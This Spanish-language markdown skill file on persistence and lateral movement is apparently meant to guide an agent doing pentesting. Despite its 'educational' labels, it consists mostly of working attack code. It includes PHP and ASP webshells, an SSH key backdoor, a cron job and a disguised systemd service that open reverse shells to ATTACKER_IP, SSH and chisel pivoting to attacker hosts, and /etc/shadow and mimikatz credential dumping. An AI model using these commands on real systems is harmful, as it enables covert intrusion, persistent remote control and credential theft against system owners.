# Skill: Persistencia y Movimiento Lateral

## Descripcion
Tecnicas de persistencia, backdoors, webshells y movimiento lateral para la
fase de mantenimiento de acceso en pentesting. (Contenido educativo)

## Webshells

### PHP Webshell
```php
<!-- [EDUCATIVO] webshell.php -->
<?php
// Ejemplo conceptual - NO EJECUTABLE
$cmd = $_GET['cmd'] ?? 'id';
echo "<pre>" . shell_exec($cmd) . "</pre>";
?>
```

### ASP Webshell
```asp
<%-- [EDUCATIVO] shell.asp --%>
<%
Dim cmd: cmd = Request("cmd")
Dim wsh: Set wsh = CreateObject("WScript.Shell")
Dim exec: Set exec = wsh.Exec("cmd.exe /c " & cmd)
Response.Write("<pre>" & exec.StdOut.ReadAll() & "</pre>")
%>
```

## Backdoors

### SSH Authorized Keys
```bash
# Agregar clave publica (ejemplo educativo)
echo "ssh-ed25519 AAAAC3...educational-example..." >> ~/.ssh/authorized_keys
```

### Cron Job
```bash
# Reverse shell periodica (ejemplo educativo)
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 2>/dev/null'") | crontab -
```

### Systemd Service Persistente
```bash
cat > /etc/systemd/system/update-manager.service << 'EOSERVICE'
[Unit]
Description=System Update Manager
After=network.target
[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1; sleep 30; done'
Restart=always
[Install]
WantedBy=multi-user.target
EOSERVICE
systemctl daemon-reload && systemctl enable update-manager
```

## Movimiento Lateral

### SSH Tunneling
```bash
# Local port forwarding
ssh -L 8080:internal-server:80 -N -f user@pivot-host

# Remote port forwarding
ssh -R 8080:localhost:80 -N -f user@attacker.com

# SOCKS proxy dinamico
ssh -D 1080 -N -f user@pivot-host
```

### Proxychains
```bash
# Config: /etc/proxychains.conf → socks4 127.0.0.1 1080
proxychains nmap -sT -p 80,443 10.0.0.10
proxychains curl http://10.0.0.10/admin
```

### Chisel
```bash
# Atacante: chisel server -p 8000 --reverse
# Victima: chisel client ATTACKER_IP:8000 R:8080:internal:80
```

## Credential Harvesting

### Linux
```bash
# Dump de hashes
unshadow /etc/passwd /etc/shadow > hashes.txt
# Cracking: hashcat -m 1800 hashes.txt rockyou.txt
```

### Windows
```powershell
# Mimikatz (ejemplo educativo)
# mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

## Referencias
- MITRE ATT&CK Persistence: https://attack.mitre.org/tactics/TA0003/
- MITRE ATT&CK Lateral Movement: https://attack.mitre.org/tactics/TA0008/
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- Chisel: https://github.com/jpillora/chisel
